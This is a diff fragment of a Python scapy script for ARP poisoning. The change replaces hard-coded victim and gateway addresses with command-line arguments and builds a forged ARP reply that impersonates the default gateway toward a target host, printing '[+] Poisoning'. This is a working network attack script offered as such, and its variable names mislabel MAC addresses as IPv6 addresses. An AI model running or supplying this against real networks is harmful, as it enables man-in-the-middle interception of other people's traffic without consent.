@@ -2,10 +2,13 @@ import signal, sys
 from scapy.all import *
 
 def main():
-	ip_to_infect = "10.67.101.104" # input("Ip to infect\n")
-	ip_to_infect_v6 = "48:0f:cf:42:a2:43" # input("Ip(v6) to infect\n")
-	default_gateway = "10.67.101.254"
-	my_ip_v6 = "48:0f:cf:47:0d:30"
+	if (len(sys.argv) != 5):
+		raise Exception("ARP Poisoning needs IP, IPV6, and the default gateway to work!")
+	
+	ip_to_infect = sys.argv[1]
+	ip_to_infect_v6 = sys.argv[2] 
+	default_gateway = sys.argv[3] 
+	my_ip_v6 = Ether().src
 	poison_packet = ARP(hwsrc=my_ip_v6,hwdst=ip_to_infect_v6, pdst=ip_to_infect,psrc=default_gateway, op=2)
 	print("[+] Poisoning %s" % (ip_to_infect))
 	count = 0
